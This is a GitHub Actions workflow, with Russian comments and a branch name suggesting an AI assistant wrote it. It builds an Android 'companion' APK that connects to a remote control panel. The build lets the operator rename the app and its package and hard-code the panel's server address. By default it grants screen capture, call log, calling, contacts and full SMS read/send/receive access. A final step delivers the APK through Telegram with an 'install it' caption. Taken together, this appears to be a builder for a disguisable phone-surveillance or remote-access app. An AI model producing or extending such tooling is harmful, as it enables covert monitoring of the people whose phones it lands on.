name: Build companion APK

# Собирает APK телефонного приложения-компаньона (камера → панель).
# Запуск вручную из вкладки Actions. Можно задать имя приложения, package
# и адрес панели по умолчанию — они будут зашиты в APK.

on:
  push:
    branches: ["claude/remote-phone-control-panel-2tpseh"]
    paths:
      - "remote-control/android-companion/**"
      - ".github/workflows/build-apk.yml"
  workflow_dispatch:
    inputs:
      app_name:
        description: "Название приложения"
        required: false
        default: "Camera Companion"
      application_id:
        description: "Package (applicationId), напр. com.artem.cameracompanion"
        required: false
        default: "com.artem.cameracompanion"
      default_server:
        description: "Адрес панели по умолчанию (IP:порт), необязательно"
        required: false
        default: ""
      permissions:
        description: "Список разрешений через запятую: CAMERA,RECORD_AUDIO,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN,LOCATION,MEDIA_IMAGES,MEDIA_VIDEO,CALENDAR"
        required: false
        default: "CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN"
      tg_token:
        description: "Telegram Bot Token (APK отправится в Telegram после сборки)"
        required: false
        default: ""
      tg_chat_id:
        description: "Telegram Chat ID"
        required: false
        default: ""

jobs:
  build:
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: remote-control/android-companion
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Set up Android SDK
        uses: android-actions/setup-android@v3

      - name: Install Android SDK platform 34
        run: yes | sdkmanager --install "platforms;android-34" "build-tools;34.0.0" 2>/dev/null || true

      - name: Set up Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: "8.2"

      - name: Inject build parameters
        run: |
          APP_NAME="${{ github.event.inputs.app_name || 'Camera Companion' }}"
          APP_ID="${{ github.event.inputs.application_id || 'com.artem.cameracompanion' }}"
          SERVER="${{ github.event.inputs.default_server }}"
          PERMS="${{ github.event.inputs.permissions || 'CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN' }}"

          cat > build.properties.generated <<EOF
          ARP_APP_NAME=${APP_NAME}
          ARP_APPLICATION_ID=${APP_ID}
          ARP_DEFAULT_SERVER=${SERVER}
          EOF

          # Проверка наличия разрешения в списке
          has_perm() { echo ",$PERMS," | grep -qF ",$1,"; }
          # Удалить маркерный блок из манифеста
          remove_block() { sed -i "/<!--${1}-->/,/<!--${2}-->/d" app/src/main/AndroidManifest.xml; }

          MANIFEST="app/src/main/AndroidManifest.xml"

          # Разрешения без маркерных блоков
          has_perm "CAMERA"       || { sed -i '/android\.permission\.CAMERA/d' "$MANIFEST"; sed -i '/FOREGROUND_SERVICE_CAMERA/d' "$MANIFEST"; }
          has_perm "RECORD_AUDIO" || { sed -i '/android\.permission\.RECORD_AUDIO/d' "$MANIFEST"; sed -i '/FOREGROUND_SERVICE_MICROPHONE/d' "$MANIFEST"; }
          has_perm "NOTIFICATIONS" || sed -i '/POST_NOTIFICATIONS/d' "$MANIFEST"
          has_perm "SCREEN"       || { sed -i '/FOREGROUND_SERVICE_MEDIA_PROJECTION/d' "$MANIFEST"; remove_block "CONTROL_SERVICE_START" "CONTROL_SERVICE_END"; }

          # Разрешения с маркерными блоками
          has_perm "PHONE_STATE"  || remove_block "PHONE_STATE_PERM_START"   "PHONE_STATE_PERM_END"
          has_perm "CALL_LOG"     || remove_block "CALL_LOG_PERM_START"      "CALL_LOG_PERM_END"
          has_perm "CALL_PHONE"   || remove_block "CALL_PHONE_PERM_START"    "CALL_PHONE_PERM_END"
          has_perm "CONTACTS"     || remove_block "CONTACTS_PERM_START"      "CONTACTS_PERM_END"
          has_perm "READ_SMS"     || remove_block "READ_SMS_PERM_START"      "READ_SMS_PERM_END"
          has_perm "SEND_SMS"     || remove_block "SEND_SMS_PERM_START"      "SEND_SMS_PERM_END"
          has_perm "RECEIVE_SMS"  || remove_block "RECEIVE_SMS_PERM_START"   "RECEIVE_SMS_PERM_END"
          has_perm "BT_CONNECT"   || remove_block "BT_CONNECT_PERM_START"    "BT_CONNECT_PERM_END"
          has_perm "BT_SCAN"      || remove_block "BT_SCAN_PERM_START"       "BT_SCAN_PERM_END"
          has_perm "LOCATION"     || remove_block "LOCATION_PERM_START"      "LOCATION_PERM_END"
          has_perm "MEDIA_IMAGES" || remove_block "MEDIA_IMG_PERM_START"     "MEDIA_IMG_PERM_END"
          has_perm "MEDIA_VIDEO"  || remove_block "MEDIA_VID_PERM_START"     "MEDIA_VID_PERM_END"
          has_perm "CALENDAR"     || remove_block "CALENDAR_PERM_START"      "CALENDAR_PERM_END"

          # Легаси-разрешение для медиа (Android ≤12): убрать если оба медиа не выбраны
          if ! has_perm "MEDIA_IMAGES" && ! has_perm "MEDIA_VIDEO"; then
            remove_block "MEDIA_LEGACY_PERM_START" "MEDIA_LEGACY_PERM_END"
          fi

          # foregroundServiceType
          FST=""
          has_perm "SCREEN"       && FST="mediaProjection"
          has_perm "CAMERA"       && FST="${FST:+$FST|}camera"
          has_perm "RECORD_AUDIO" && FST="${FST:+$FST|}microphone"
          if [ -n "$FST" ]; then
            sed -i "s/android:foregroundServiceType=\"[^\"]*\"/android:foregroundServiceType=\"$FST\"/" "$MANIFEST"
          else
            sed -i '/android:foregroundServiceType/d' "$MANIFEST"
          fi

          echo "=== Permissions in build: $PERMS ==="
          echo "=== Manifest uses-permission lines ==="
          grep 'uses-permission\|foregroundService' "$MANIFEST" || true

      - name: Build debug APK
        run: gradle assembleDebug --no-daemon --stacktrace

      - name: Upload APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: camera-companion-apk
          path: remote-control/android-companion/app/build/outputs/apk/debug/app-debug.apk
          if-no-files-found: error

      - name: Send APK to Telegram
        if: ${{ github.event.inputs.tg_token != '' && github.event.inputs.tg_chat_id != '' }}
        env:
          TG_TOKEN: ${{ github.event.inputs.tg_token }}
          TG_CHAT_ID: ${{ github.event.inputs.tg_chat_id }}
          APP_NAME: ${{ github.event.inputs.app_name || 'Camera Companion' }}
        run: |
          APK="app/build/outputs/apk/debug/app-debug.apk"
          curl -s \
            -F "chat_id=${TG_CHAT_ID}" \
            -F "document=@${APK};filename=${APP_NAME}.apk" \
            -F "caption=✅ ${APP_NAME} — APK готов, устанавливай!" \
            "https://api.telegram.org/bot${TG_TOKEN}/sendDocument" \
            | grep -q '"ok":true' && echo "Telegram: sent" || echo "Telegram: send failed (check token/chat_id)"
